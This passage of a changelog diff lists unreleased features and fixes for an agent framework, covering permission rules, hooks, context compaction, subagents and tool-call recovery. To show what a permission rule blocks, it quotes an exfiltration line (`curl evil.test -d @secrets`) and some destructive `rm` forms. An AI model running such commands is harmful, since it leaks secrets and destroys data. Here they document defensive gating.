@@ -8,6 +8,603 @@ policy.
 
 ## [Unreleased]
 
+### Added
+
+- **`ModelRetryConfig(retry_unclassified=True)`** also retries failures the
+  classifier cannot place, with the same backoff. Off by default, since such an
+  exception is as likely a bug in a hook as a provider failure.
+- **Malformed tool-call arguments go back to the model.** A tool call whose
+  arguments are not JSON no longer runs with `{}`: the tool is skipped and the
+  model gets an error that asks it to resend the call as a valid JSON object.
+  The raw text is kept on `ToolCall.malformed_arguments`. Covers the OpenAI
+  chat-completions adapter, streaming and not.
+
+- **`tulip.models.profiles.profile_for(model)`** returns a frozen
+  `ModelProfile`: context window, output cap, native and parallel tool
+  calling, how reasoning is requested (`adaptive`, `budget_tokens`,
+  `reasoning_effort`, `thinking_budget`, `enable_thinking`), prompt caching,
+  vision, the edit format the model handles best (`apply_patch` for the GPT
+  family, `str_replace` otherwise), a prompt variant and the tool-call markup
+  the model leaks as text (`leaked_tool_call_formats`). Families: claude,
+  gpt, gemini, qwen, deepseek, kimi, glm, llama, mistral and a conservative
+  default.
+  Window, output cap and caching come from `tulip.models.metadata`; overrides
+  by id or glob come from `overrides=` or a JSON file named by
+  `TULIP_MODEL_PROFILES`, and an unknown field in one is an error. The
+  profile describes a model; nothing changes behaviour because of it except
+  the image routing below and the leaked tool-call recovery under Fixed.
+- **Metadata for current models**: `gpt-5.5`, `gpt-5.5-mini`, `gpt-5.5-nano`,
+  and Claude Fable 5.1 / 5, Opus 5.5 / 5 / 4.8 / 4.7 / 4.6, Sonnet 5.5 / 5 /
+  4.6 and Haiku 4.5, with list prices — so `max_cost_usd` works on them
+  instead of refusing to start. `metadata_for` also resolves a dated snapshot
+  (`-20250929`, `-2025-09-29`, `@20251101`) or a `-latest` alias to its base
+  record; no other suffix is stripped, so `gpt-5.6` never borrows `gpt-5`'s
+  price.
+- **`TerminateEvent.cost_usd`** (USD, `None` when the model is unpriced),
+  **cache tokens in `TerminateEvent.usage`** (`cache_read_input_tokens`,
+  `cache_creation_input_tokens`, present only when non-zero), and
+  **`TerminateEvent.error`**, the failure's text when `reason == "error"`. A
+  resumed or continued segment that fails now emits that error termination
+  too; it used to raise without one.
+- **Images in user messages.** A user turn carrying `encode_image` segments
+  is sent as text and image parts on Anthropic, OpenAI chat-completions and
+  the Responses API; Bedrock sends a placeholder instead of the base64 text.
+  On chat-completions a tool result's images (which a tool message cannot
+  hold) now follow the tool batch in a user message when the model's profile
+  says it can see; a text-only model keeps getting the placeholder.
+- **`tulip.tools.structured_output.StructuredOutputTool(schema)`** holds a
+  turn to a final answer that matches a JSON Schema document, for callers
+  that have a schema rather than a Pydantic model and drive `run()` (a CLI's
+  `--json-schema`, an API taking a schema per request). The model delivers
+  the answer as the arguments of a tool whose parameters are the schema. A
+  call that does not validate comes back as a tool error listing every
+  offending path, and a turn that tries to end without a valid call is sent
+  back by a `final_answer_verifier` (`agent_options()`; `max_reminders`
+  replans). `value_from(executions)` reads the answer back, and
+  `load_schema(source)` takes inline JSON or a file path. A non-object
+  top-level schema is wrapped as `{"value": ...}` and unwrapped on the way
+  out. The tool is deliberately not a terminal tool, because the loop stops on
+  a terminal tool even when the call failed.
+- **`tulip.core.json_schema.validate(value, schema)`** — a dependency-free
+  validator for the JSON Schema keywords structured output uses (types,
+  enum/const, object and array constraints, string and number bounds,
+  combinators, `if`/`then`/`else`, local `$ref`). It returns path-prefixed
+  messages; `check_schema` rejects an unusable schema up front.
+- **`tulip.agent.tasks.task_tool`: delegation as a tool.** The `task` tool
+  coding agents converge on (Claude Code's `Agent`, Codex's `spawn_agent`,
+  opencode's `task`), built on `run_subagent`'s plumbing. Each call runs a
+  subagent of a named type in its own conversation and returns its final
+  answer plus a `task_id`; passing the `task_id` back continues that
+  subagent's conversation instead of starting cold. Several calls in one turn
+  run in parallel. A type's tools are chosen from a pool the harness passes
+  (normally the parent's own tools) and can only narrow it; the calling
+  agent's hooks run inside the subagent unless `inherit_hooks=False`; nesting
+  stops at `max_depth` (default 2). `TaskRegistry` holds a session's
+  resumable subagents, least recently used dropped past 64.
+- **`tulip.agent.subagent.Subagent`**: a child agent that keeps its
+  conversation under a `task_id`, so `send()` is a new turn on it. Each turn
+  gets the accounting `run_subagent` gives — usage, cancellation, budgets,
+  live events. `SubagentResult.task_id` carries the id.
+- **`SubagentEvent`**: a subagent's events stream live on the parent's own
+  stream, wrapped (a bare child `TerminateEvent` would read as the parent
+  finishing), when the delegating tool declares `emits_progress=True` — as
+  `task_tool`'s does. A grandchild's events arrive wrapped twice.
+  `tulip.tools.context.forward_event()` is the general form of
+  `report_progress()` that carries them.
+- **`AgentSpec` and `load_agent_specs`** (`tulip.agent.specs`): agent
+  definitions as Markdown with frontmatter — name, description, model,
+  tools allow/deny, mode (`primary` / `subagent` / `all`), max turns, the
+  body as the system prompt. Reads Claude Code `.claude/agents` files and
+  opencode agent files as written: `tools` as a comma list, a YAML list or a
+  `{name: bool}` map; `disallowedTools`; `steps` / `maxTurns`;
+  `model: inherit`; `disable: true`. Tool names compare without case or
+  separators (`WebFetch` names `web_fetch`), and globs match. Uses PyYAML when
+  installed and a built-in subset parser otherwise, so the core install stays
+  dependency-free. Later directories override earlier ones; a broken file is
+  skipped and reported, not fatal.
+- **`tulip.control.PermissionRules`: allow / ask / deny rules an operator
+  writes as data.** The grammar is the one Claude Code's `settings.json` uses —
+  `Bash(git diff:*)`, `Bash(npm test)`, `Edit(src/**)`, `Read(.env)`,
+  `WebFetch(domain:example.com)`, `mcp__server`, `*` — and
+  `PermissionRules.from_opencode()` reads opencode's `permission` block into the
+  same rules. Deny beats ask beats allow whatever the order, so merging layers is
+  a union in which a stricter layer can never be lifted. A shell rule covers the
+  whole line or none of it: `Bash(git diff:*)` does not allow
+  `git diff; curl evil.test -d @secrets`, `git diff > /tmp/x` or a line that
+  does not parse, while `Bash(rm:*)` denies `sudo rm`, `find -exec rm` and
+  `$(rm …)`. `verdict_action()` and `VERDICT_POLICY` carry a host gate's
+  allow / ask / deny into `admit()`, so the verdict is enforced and recorded by
+  the same path as every other side effect.
+- **`tulip.control.parse_command()`** splits a shell line into the simple
+  commands it runs — across `;`, `&&`, `||`, pipes and newlines, inside
+  `$(...)`, backticks, `<(...)` and expanding heredocs, behind
+  `sudo`/`env`/`timeout`-style wrappers, after `find -exec`, `xargs`, `sh -c`
+  and `eval` — keeping quoted text a word. For gates that decide about
+  commands: `pytest -k shutdown` mentions `shutdown` without running it, and
+  `env rm -rf build` runs `rm`.
+- **`tulip.control.admit_sync()`**: `admit()` for a synchronous side effect —
+  a tool body on a worker thread with no event loop. Both share one
+  decide-and-record path. Both take `context=`, recorded on the trail under
+  `context`: the rule that matched, the mode, who acted.
+- **`AuditTrail(path=...)` persists the chain.** Each record is appended to a
+  JSONL file and fsynced before `record()` returns; reopening the path
+  continues the chain. Recording is now thread-safe. `AuditTrail.check()` and
+  `check_jsonl()` return an `AuditReport` saying *where* a chain broke
+  (`broken_at`) and why, not only whether it did; `verify()` and
+  `verify_jsonl()` are unchanged.
+- **`tulip.hooks.ExternalHooks`: command and HTTP hooks configured in a
+  settings file.** The protocol is Claude Code's: the event as JSON on stdin;
+  exit 0 (with optional JSON: `decision`, `reason`, `continue`, `systemMessage`,
+  `hookSpecificOutput.permissionDecision` / `updatedInput` /
+  `additionalContext`), exit 2 to block with stderr as the reason, anything
+  else a non-blocking error. `HookConfig.from_settings()` reads the `hooks`
+  block (matchers are case-insensitive full-match regexes over the tool name),
+  with a per-hook `timeout` that kills the hook's whole process group.
+  `PreToolUse` can deny a call, rewrite its arguments, or hand an allow / ask to
+  the host's gate (`on_permission`); `PostToolUse` appends a block reason or
+  context to the result the model reads; `UserPromptSubmit` adds context or
+  raises `HookBlockedError`. **`Stop` and `SubagentStop` can block**:
+  `ExternalHooks.verifier()` is a `final_answer_verifier`, so a hook that says
+  the work is not done sends its reason back to the model and the loop goes on —
+  "verify before finishing" enforced rather than asked for. `SessionStart`,
+  `SessionEnd`, `PreCompact` and `Notification` are fired by the host with
+  `ExternalHooks.run()`. Every execution, including one the host's `guard`
+  refused, is reported to `on_run` as a `HookRun` for streaming and auditing.
+- **`AgentConfig.context_window`** and the **`TULIP_CONTEXT_WINDOW`**
+  environment variable name a model's input window, so a model the metadata
+  table does not know — a fine-tune or any self-hosted model behind vLLM,
+  LiteLLM or another OpenAI-compatible gateway — gets the token-counting
+  default (`LLMCompactor`) instead of a message window that one large tool
+  output can overflow. Precedence: an explicit `conversation_manager`, then
+  `context_window`, then the environment variable, then model metadata, then
+  a `context_window` / `context_length` the model object (or its config)
+  reports. An invalid environment value is ignored with a warning, and
+  falling back to the message window now logs, once per model, which knobs
+  name the window.
+- **`tulip.models.metadata.discover_context_length(base_url, model)`** reads
+  the window a server lists on `/models` (vLLM's `max_model_len`, or
+  `context_length`) and registers it, keeping any registered prices. It is an
+  explicit async call: agent construction stays offline.
+- **Text tool calls are off by default and never parsed out of prose.** A
+  final answer such as ``run bash(command="pytest") to verify`` used to be
+  parsed into a real ``bash`` call and executed, and ``read(path)`` ran as
+  ``read({})``. The new ``AgentConfig.text_tool_calls`` (``"auto"`` |
+  ``"on"`` | ``"off"``) decides whether the message body is parsed at all;
+  ``"auto"``, the default, parses only for a model that declares
+  ``supports_native_tool_calls = False``. When parsing is on, only
+  unambiguous shapes count: a message that is entirely JSON call objects or
+  ``name(key=value)`` lines, a ``json`` / ``tool_call`` / ``tool_code``
+  fence, or a ``<tool_call>`` tag. Call syntax needs keyword arguments that
+  are Python literals declared in the tool's schema; a positional or
+  undeclared argument rejects the call instead of being dropped. Agents on
+  a server that returns calls as text (no tool parser) set
+  ``text_tool_calls="on"``; the rogue demo's local mode does.
+
+- **`FileCheckpointer` as a session store**: `list_threads(limit, pattern)`
+  returns thread ids newest first, as they were saved (not the sanitised
+  directory names); `list_with_metadata(limit)` lists checkpoints across
+  threads without loading their state; `vacuum(older_than_days)` deletes old
+  checkpoints and the threads they leave empty; and
+  `max_checkpoints_per_thread` keeps only a thread's newest N checkpoints.
+- **`Agent.continue_turn(thread_id)`** continues a turn that stopped before
+  it finished — a process killed mid-turn — from the thread's latest
+  checkpoint. Unlike `run()`, it adds no user message: the iteration count
+  and budgets carry on, and every call whose result is in the checkpoint
+  stays done. A call the checkpoint holds without a result is answered with
+  an error saying its outcome is unknown, never re-run. A thread paused on an
+  in-process interrupt is still answered with `resume()`.
+- **Loop-level retry of transient model-call failures (`AgentConfig.model_retry`).**
+  A 429, a 5xx, a dropped connection or a timeout on any model call used to
+  end the run with `TerminateEvent(reason="error")` once the provider client
+  had spent its own retries, which a long autonomous run is all but certain
+  to hit. The loop now re-issues the call with exponential backoff and full
+  jitter (1 s doubling to 60 s, 6 retries, within a 300 s budget by default),
+  waiting what the provider's `retry-after` / `retry-after-ms` asks for when
+  it sends one. Context-length overflows, validation errors, auth and billing
+  failures, and anything the failover classifier cannot place fail at once.
+  Each retry emits a `ModelRetryEvent` (`attempt`, `delay_seconds`, `reason`,
+  `status_code`, `error`, `from_retry_after`) — live between chunks with
+  `stream_tokens=True`, otherwise once the call returns or fails. A streamed
+  call is not retried once a chunk has reached the caller, nor is a cancelled
+  run. `model_retry=False` restores the old behaviour.
+- **`tulip.tools.text_edit`** — find-and-replace for file-editing tools that
+  survives a model's near misses. `apply_edit(content, old, new,
+  replace_all=False)` tries `exact`, `line_trimmed` (indentation, tabs for
+  spaces, trailing whitespace), `whitespace_normalized` (spacing between
+  tokens), `escape_normalized` (quotes escaped one level too deep) and
+  `block_anchor` (first and last lines match, middle at least 75% similar),
+  strictest first. Every reading must be unique: a strategy that finds two
+  places refuses the edit instead of falling through to a looser one.
+  CRLF files are matched with CRLF, `new` is re-indented to the file's
+  indentation, and a miss raises `EditMatchError` with the closest region of
+  the file, numbered. `EditOutcome.strategy` says which reading matched.
+- **Summarising context compaction** (`tulip.memory.compaction.ContextCompactor`),
+  the new default for an agent whose context window is known, so a long
+  autonomous run (hours, hundreds of tool calls) keeps working when its
+  context fills. Before each model call the loop measures the request (the
+  provider's reported usage when it has one, messages plus tool definitions
+  otherwise); at `trigger_fraction` (0.9) of the window minus
+  `reserved_tokens` (default `min(20_000, window // 5)`) it first clears tool
+  outputs older than the newest `tool_output_keep_tokens` (default
+  `min(40_000, usable // 4)`) to a one-line stub naming the call, and when
+  that does not free a tenth of the window, has the agent's own model (or
+  `summary_model`) write a summary for continuation — goal and constraints,
+  decisions, files and their state, what was verified, what is left, open
+  problems, the next step — built on the previous summary. The system prompt,
+  the task message, the latest user message, memory blocks and the last
+  `tail_turns` (6) turns stay verbatim, no tool call is separated from its
+  result, and the run carries on from the summary by itself. The compacted
+  history replaces the state's, so checkpoints and the next turn start from
+  it. Configure with `AgentConfig.compaction` (`CompactionConfig`);
+  `compaction=False` keeps the previous prune-and-tail behaviour with no
+  model calls of its own.
+- **`context_exhausted` stop reason.** A compaction that cannot bring the
+  request under the threshold, or a summary needed again within
+  `min_iterations_between_summaries` (3) iterations of the last, ends the run
+  with `context_exhausted` and a message saying why, instead of compacting in
+  a loop.
+- **`CompactionEvent`** on the event stream (stage, tokens before and after,
+  threshold, the summary) and `agent.context.compacted` on the observability
+  bus; **`on_before_compaction`** hook (`BeforeCompactionEvent`) sees the full
+  history before it is compacted and can add summary instructions or skip it.
+- **`tulip.agent.CompletionCheck`**, a `final_answer_verifier` that sends a
+  run back to work when it stops before the work is done. Open-weight models
+  often end a turn on the announcement of their next step ("Let me first
+  check the conftest and the specific test area:") without the tool call, and
+  the loop took that for the answer. The check sends the model a short
+  continuation note when the reply announces an untaken step
+  (`announced_step`: a trailing colon, or a last sentence like "Let me…",
+  "I'll…", "Next, I…", in English and nine other languages; conservative,
+  tested on a corpus of real final answers), when the caller's
+  `needs_changes` signal says the task wanted changes that were not made and
+  the reply does not say why (`explains_no_change`), and, opt-in, once per
+  run when files were edited and no check ran afterwards (`edits_unchecked`).
+  At most `max_nudges` (3) per run, never twice in a row for the same reason
+  without a tool call in between. `agent_options()` gives the `Agent`
+  arguments; `requests_changes(prompt)` is a heuristic for "this task asks
+  for changes".
+- **`Continuation`**: a verifier may return one (a `str` with a `reason`) to
+  send the model back to unfinished work instead of rejecting its answer. The
+  reply stays in the conversation as an ordinary assistant message and the
+  note follows as an automated user-role message, both kept in checkpoints
+  (a rejected answer is turn-only). `FinalAnswerVerificationEvent` gains
+  `continuation` and `reason`. A nudged turn is a model call like any other:
+  it counts against `max_iterations` and every budget.
+- **`tulip.agent.chain_verifiers(*verifiers)`** runs several final-answer
+  verifiers as one (the first rejection decides; `None` entries are skipped),
+  and `max_replans_for(...)` sums their replans, so a completion check, a
+  structured-output reminder and a `Stop` hook can all hold one agent.
+
+- **`tulip.core.loops.detect_tool_loop`** and **`ToolLoop`**: the tool-loop
+  detector as a function over a run's steps, with `AgentState.tool_loop`,
+  `AgentConfig.tool_loop_read_only_threshold` and
+  `AgentConfig.tool_loop_read_only_tools`. A `tool_loop_warning`
+  `CustomEvent` marks the point where the model was warned.
+- **`CompletionCheck(insist_on_changes=True)`** sends a `no_changes` stop
+  back every time, up to `max_nudges`, until files change or the reply says
+  why none needed to, instead of accepting the second such stop in a row. For
+  unattended runs, where a model answering "make the changes" with more prose
+  has not chosen anything.
+- **Prompt caching through OpenRouter, and a rolling cache breakpoint.**
+  `AnthropicModel(prompt_cache=True)` now marks the end of the conversation
+  too (the last block of the request, and the user turn before it when a
+  slot is free; four `cache_control` markers at most), so each request reads
+  the previous one's history from the cache instead of only the instructions
+  and tools. The endpoint comes from `base_url`, else `ANTHROPIC_BASE_URL`;
+  `auth_token` (else `ANTHROPIC_AUTH_TOKEN`) is sent as a bearer token, and
+  with one an `ANTHROPIC_API_KEY` from the environment is never sent along.
+  Against `https://openrouter.ai/api` a Claude id is sent as OpenRouter's
+  slug (`claude-sonnet-5-5` as `anthropic/claude-sonnet-5.5`), and
+  `metadata_for` resolves that slug to the Claude record.
+- **Cache and provider cost on every run.** The OpenAI-compatible binding
+  keeps `prompt_tokens_details.cached_tokens` (and OpenRouter's
+  `cache_write_tokens`) as `cached_tokens` / `cache_write_tokens` in usage —
+  inside `prompt_tokens`, unlike Anthropic's `cache_read_input_tokens` — and
+  the cost a provider reports (OpenRouter's `usage.cost`) as
+  `ModelResponse.cost_usd` / `ModelChunkEvent.cost_usd`. Both reach
+  `TerminateEvent` (`usage["cached_tokens"]`, `reported_cost_usd`),
+  subagents' spend included. `AgentState.with_response_usage` records a
+  response's whole usage block.
+- **`AgentConfig.budget_nudge_at`** (default `0.8`): once a run has used that
+  fraction of a budget — `token_budget`, `max_cost_usd`,
+  `time_budget_seconds`, or a `max_iterations` of 10 or more — the model gets
+  one appended note to converge (finish the change in progress, verify it,
+  report; the task still has to be done) and a `budget_nudge` `CustomEvent`
+  is emitted. `None` turns it off.
+- **`AgentSpec.token_budget`** (frontmatter `token_budget`, `tokenBudget` or
+  `max_tokens`) caps what one delegated task of that type may spend; the
+  `task` tool gives it to the subagent, the smaller of it and any
+  `token_budget` in `agent_kwargs`.
+- **`tulip.tools.action_fusion`** lets a file-changing tool take an optional
+  `then_run: {command, timeout?}` and run that command once the change has
+  landed, returning one result: the change's report, then `[then_run] $ cmd`
+  with the command's exit code and output. The command is skipped (marked
+  `[then_run skipped]`, with the reason) when the change failed, when a written
+  file's SHA-256 no longer matches what was written, or when the host refuses
+  it. `FileLocks` holds one lock per canonical path, from a thread or a
+  coroutine, so two fused calls on one file never interleave. `fuse()` takes
+  the host's own shell runner, so the gate, hooks and limits of its shell tool
+  apply unchanged; `fusable(tool, enabled=)` adds or hides the argument in the
+  tool's schema. The mechanism is SoL-Pi's (NVIDIA, arXiv 2609.20519),
+  reimplemented.
+- **`tulip.observability.mechanisms.MechanismLedger`**: a per-run record of
+  the harness mechanisms that fired — name, whether it triggered, steps and
+  tokens or bytes saved (estimates), outcome — in memory and as JSONL, with
+  `summary()` counters per mechanism for one-change-at-a-time ablations.
+  `record_mechanism()` writes to the ledger bound with `bind_ledger()` and is
+  a no-op without one. Recorded: fused calls, leaked tool-call recoveries, and,
+  through `observe(event)`, completion-check continuations, compactions and
+  tool-loop warnings.
+- **`ExternalHooks.pre_tool_use()` / `post_tool_use()`** run `PreToolUse` and
+  `PostToolUse` for a call a tool makes inside its own body — a fused edit's
+  command is seen by the hooks as `bash`, with the same deny, rewritten input
+  and gate verdict a standalone call gets. `ToolCallVerdict` is what
+  `pre_tool_use()` returns.
+- **ObservationPack** (`AgentConfig.observation_pack`, off by default;
+  `True` or an `ObservationPackConfig`), adapted from SoL-Pi
+  (arXiv 2609.20519, MIT). A text tool output over `threshold_bytes` (10 KiB)
+  is sent whole in its first `full_sends` (2) requests; after that the
+  *request* shows a placeholder — an id, its size and about a kilobyte of its
+  first and last lines — while the run's state and checkpoints keep the full
+  output. The exact bytes go to a content-addressed archive per session
+  (`<directory>/<thread>/observation-pack/`), and the `obs_recall` tool,
+  registered with it, pages them back by byte offset or line (16 KB / 400
+  lines a call). Swaps are batched against the prompt cache: due outputs
+  wait until together they free `min_batch_bytes` (32 KiB) and the
+  cache-read savings over the expected rest of the run (the requests so far,
+  capped at those left before compaction) beat rewriting the cached suffix,
+  or until the prefix breaks anyway, when they go for free; the prices are
+  `cache_read_cost` / `cache_write_cost` (`SwapCostModel`). The context
+  compaction measures is the one sent, so swapped outputs no longer bring a
+  compaction closer; compaction clears outputs into stubs naming their
+  archive id instead of lossy ones, and a summary lists the ids of the
+  outputs it folded (carried into the next summary). Any failure sends the
+  full output. Swaps, recalls and bytes saved are counted in
+  `agent.observation_pack.stats(thread_id)`, recorded in the run's
+  `MechanismLedger` as `observation_pack` (swap batches, bytes not resent
+  per request, recalls, recallable clears, fail-opens), announced as
+  `observation_pack` `CustomEvent`s and logged to the session's
+  `ledger.jsonl`.
+- **ObservationPack loses nothing to the per-result cap, and covers
+  subagents.** With the pack on, `max_tool_result_length` no longer cuts a
+  tool output before the pack sees it: up to
+  `ObservationPackConfig.max_inline_chars` (128,000 characters, at most an
+  eighth of a known window) goes whole, and a larger output is archived whole
+  on arrival and sent cut around a pointer naming its archive id and the byte
+  offset of the cut, so `obs_recall` reads exactly what was left out. The cap
+  still applies with the pack off, when archiving fails, with images, or with
+  a `tool_result_store`. A subagent started by a run with the pack (the
+  `task` tool, `run_subagent`, `Subagent`) gets the parent's settings and
+  `obs_recall`, archives under `<session>/subagents/<task>/`, and its ledger
+  rows carry its name; an explicit `observation_pack=` from the caller wins.
+  `docs/observation-pack.md` describes the mechanism and its status.
+
+- **Loop-level retry of transient model-call failures (`AgentConfig.model_retry`).**
+  A 429, a 5xx, a dropped connection or a timeout on any model call used to
+  end the run with `TerminateEvent(reason="error")` once the provider client
+  had spent its own retries, which a long autonomous run is all but certain
+  to hit. The loop now re-issues the call with exponential backoff and full
+  jitter (1 s doubling to 60 s, 6 retries, within a 300 s budget by default),
+  waiting what the provider's `retry-after` / `retry-after-ms` asks for when
+  it sends one. Context-length overflows, validation errors, auth and billing
+  failures, and anything the failover classifier cannot place fail at once.
+  Each retry emits a `ModelRetryEvent` (`attempt`, `delay_seconds`, `reason`,
+  `status_code`, `error`, `from_retry_after`) — live between chunks with
+  `stream_tokens=True`, otherwise once the call returns or fails. A streamed
+  call is not retried once a chunk has reached the caller, nor is a cancelled
+  run. `model_retry=False` restores the old behaviour.
+
+### Changed
+
+- **A summary that fails is retried with shorter input.** The second summary
+  attempt shortens each folded message to its first and last 2,000 characters,
+  so an over-size failure can succeed. Before, both attempts sent identical input.
+
+- **History is append-only between compactions**, so a provider's prefix
+  cache keeps serving it (`tests/unit/test_cache_prefix.py` checks every
+  request of scripted sessions against the one before, in Tulip's messages
+  and on the OpenAI and Anthropic wire). A recalled-memory block now goes
+  right after the turn's prompt instead of after the system prompt: it
+  changes every turn, and at the front it made every turn resend the whole
+  conversation uncached. `SlidingWindowManager` keeps a mid-run system note
+  where it was written instead of moving it to the front, and slides in
+  steps (`slide_step`; the agent's default window uses a quarter of its
+  size) rather than one message per request; `LLMCompactor` moves its
+  tool-output and tail cuts in steps too (`slide_step`, 8 by default in the
+  agent).
+- **The `task` tool asks for less and gets more back.** Its description says
+  to delegate broad searches across many files, not reading a few known
+  files, and to work from the subagent's path:line citations; the default
+  subagent prompt asks for `path:start-end` with the lines that answer the
+  question quoted, so the parent does not read the same files again, and to
+  stop as soon as it can answer.
+
+- **A subagent shares its parent's budgets.** A child started from a running
+  agent gets the smaller of its own limit and what the parent has left of
+  `time_budget_seconds`, `token_budget` and, when the child's model is
+  priced, `max_cost_usd`; one started with nothing left returns at once with
+  that budget as its stop reason, without calling its model. A child's spend
+  now folds into the parent's at the child's own prices when they are known,
+  rather than the parent's.
+- **An oversized tool result keeps its head and its tail.** Past
+  `max_tool_result_length`, the loop used to keep the first N characters, so
+  a test run, build or lint lost its verdict: the failing test and the
+  `1 failed, 39999 passed` summary are printed last. The cut now keeps the
+  first 40% and the last 60% of the budget, with a marker between them —
+  `[OUTPUT TRUNCATED — 38123 of 40123 chars cut; first 800 and last 1200 kept]`.
+  The new `AgentConfig.tool_result_head_fraction` sets the split; `1.0` keeps
+  only the head, as before. The marker still starts `[OUTPUT TRUNCATED`, but
+  its wording changed, so code matching `original: N chars` needs updating.
+
+- `checkpoint_every_n_iterations` also applies to resumed and continued
+  segments (`resume()`, `continue_turn()`), which previously saved only at
+  the end.
+- **Per-iteration checkpoints are on by default where they leave nothing
+  behind.** `checkpoint_every_n_iterations` now defaults to `None`: `1` for a
+  run with a `thread_id` on a checkpointer that can delete a single
+  checkpoint (`BaseCheckpointer.deletes_single_checkpoints`, true for the
+  memory, file, HTTP, S3 and storage-adapter backends), `0` otherwise — a
+  thread-less run, or a backend such as `DeltaCheckpointer` whose saves
+  depend on each other. Each iteration save records its id in the state, and
+  the turn's final save deletes them all, including saves made by a process
+  that was killed before finishing the turn. A kill loses at most the
+  iteration in flight, while `get_state_history`, `fork` and storage see one
+  checkpoint per turn, as before. `keep_iteration_checkpoints=True` keeps them
+  as history; an explicit `0` restores per-turn saves only.
+- **A new turn on a thread whose last turn was killed mid-call** answers the
+  calls left without a result with the same "outcome unknown" error
+  `continue_turn()` uses, instead of sending the provider a tool call with no
+  result, which it rejects.
+- **`FileCheckpointer` writes atomically and survives a torn file.** Each
+  checkpoint is written beside its target and renamed into place, so a kill
+  mid-write leaves the previous checkpoint intact; a file that does not parse
+  is skipped with a warning instead of making the thread unloadable, and
+  loading a thread's latest state falls back to the newest one that parses.
+  Listing a thread's checkpoints reads only each file's head and tail rather
+  than parsing every saved conversation in full.
+- The deepagent `StateBackend` and `FilesystemBackend` read `edit_file`'s
+  `old_str` through `apply_edit`, so a snippet with the wrong indentation or
+  spacing now edits instead of failing, and a miss names the closest region.
+  The `not found` / `matches N times` messages are unchanged.
+- An agent with a known context window now summarises older history when
+  clearing tool output is not enough, which costs a model call per summary
+  (counted against token and cost budgets). Set `compaction=False` for the
+  previous behaviour.
+
+- **A tool loop is warned about before it stops the run, and only a real
+  loop counts.** A loop is now the same step — calls by name and arguments,
+  *and their results* — repeated back to back with nothing in between, or the
+  same cycle of steps (A, B, A, B, …) repeated whole. A re-read between other
+  work, a repeat whose result changed and the same tool with other arguments
+  are progress. Steps made only of read-only tools (`read`, `ls`, `glob`,
+  `grep`, …) need one repeat more than `tool_loop_threshold`. When a loop
+  reaches its threshold the model gets a `[Repeated tool call]` note naming
+  the call and asking for another approach; the run stops with `tool_loop`
+  only if the loop repeats once more. `AgentState.has_tool_loop` still
+  reports detection; `AgentState.tool_loop_persists` is what stops a run.
+- **The completion check counts a fused check.** An edit that ran a check
+  command as `then_run` is an edit and a check at once for
+  `edits_unchecked`; one whose command was skipped is still unchecked.
+
+### Fixed
+
+- **A cached Claude run is no longer counted as nearly free.** Anthropic's
+  `cache_read_input_tokens` and `cache_creation_input_tokens` sit beside
+  `prompt_tokens`, and spend left them out, so `cost_usd` and `max_cost_usd`
+  saw only the uncached tail of each request. They are now priced at
+  Anthropic's multiples of the input price (reads 0.1x, writes 1.25x).
+  With `prompt_cache=True` every turn is sent as a block list, so a turn the
+  rolling breakpoint has moved past is byte-identical to how it was cached.
+
+- **An empty reply mid-task no longer ends the run as `complete`.** A reply
+  with no text and no tool call, in a turn that had called tools, got a
+  tool-less "give your final answer" call, so a model that lost one call to
+  the provider (a reasoning-only turn, a call left in the reasoning channel)
+  wrote "the system requested my final answer before I could make the edits"
+  and the run was reported complete with nothing changed. The first such reply
+  in a turn is now sent back with the tools (`[Empty reply]`); the tool-less
+  final-answer call remains the fallback for a second one, and for a turn that
+  has called no tool yet.
+- **A subagent stopped by its spend budget reports `cost_budget`**, not
+  `complete`: the runtime's copy of the stop-reason list had drifted from the
+  agent's and lacked it. Both now read one list, `tulip.agent.result.STOP_REASONS`,
+  derived from `StopReason`.
+- **A tool call a model writes in its own markup is made, not taken for the
+  answer.** DeepSeek V4 through OpenRouter answered with
+  `<｜DSML｜tool_calls><｜DSML｜invoke name="edit">…` in the message body and
+  no structured call; the loop read it as the final answer and the run ended
+  with the edit never made. A model family now declares the markup it leaks
+  (`ModelProfile.leaked_tool_call_formats`): DeepSeek's DSML and its
+  V3/V3.1 `<｜tool▁calls▁begin｜>` form, Hermes/Qwen `<tool_call>{json}`,
+  Qwen3-Coder's `<function=…>` XML, Kimi K2's tool-call section and GLM's
+  `<arg_key>`/`<arg_value>` pairs. The loop recognises those even for a
+  model with native tool calling (`tulip.agent.leaked_tool_calls`), but only
+  when the whole message after any leading prose is one such block and every
+  call names a registered tool with declared arguments and its required
+  ones; one bad call rejects the block. The markup is replaced by the
+  structured call in the conversation. `AgentConfig.leaked_tool_call_formats`
+  overrides the profile (`[]` turns it off), as does `text_tool_calls="off"`.
+  A resumed turn recovers text calls the same way as the first pass.
+- **A leaked call is made wherever the reply puts it.** In real runs on
+  `litellm:openrouter/deepseek/deepseek-v4-pro` the DSML never reached the
+  recovery above: DeepSeek left its call at the end of the reasoning channel,
+  so the reply had no body; the second empty reply made the loop ask for a
+  final answer with the tools taken away, and with nothing to call the model
+  wrote its call as DSML, which became the run's answer — and every
+  continuation the completion check sent got the same. Now a reply with no
+  body whose reasoning ends in the model's markup is that call, and a reply
+  to the no-tools final-answer request that is a call is the turn's tool
+  step (the request is dropped from the history). An iteration-limit summary
+  that is a call falls back to the last answer or the deterministic summary.
+- **A call cut off by the output limit is asked for again.** A reply that
+  opens one of the model's call blocks and never closes it — a large `write`
+  stopped at `max_tokens` — was taken for the final answer. The model is now
+  sent back with an automated user-role note to make the call again, smaller
+  if it was cut off (`tulip.agent.leaked_tool_calls.unfinished_leaked_tool_call`),
+  up to twice in a row before the reply is taken as it is.
+- **`requests_changes` recognises task prompts it missed.** It read only a
+  change verb at the start of a sentence, and sentences ended only at `.!?;`,
+  so a spec written one requirement a line ("…\nMake the library directory
+  count as a media root"), a prompt opening "Let people ask…", a stated
+  requirement ("The response must contain the totals") and an interface
+  section ("- `generation_dir()`: the live generation's directory") all read
+  as questions, and a run that changed nothing on them was never sent back.
+  Lines are now clauses, more change verbs count (not those that as often ask
+  for information, such as "show" or "review"), and requirement sentences,
+  interface items and "Done when:" lines count unless the prompt opens by
+  asking.
+- **`explains_no_change` no longer takes the run's own stop for a reason.**
+  "The system requested my final answer before I could make the edits" and
+  "I ran out of iterations" matched its "could not" / "unable to" patterns,
+  so a run that stopped mid-task was accepted as having explained itself.
+- **Compaction keeps the user's request verbatim even after an automated
+  note.** The summariser pinned the newest user-role message as "the user's
+  latest request", and a verifier's feedback or a continuation note is
+  user-role, so the real request could be folded into the summary. Messages
+  the loop writes (`tulip_automated_note`, or turn-only) are no longer taken
+  for it.
+- **A `NoToolCalls` termination condition no longer ends a run the verifier
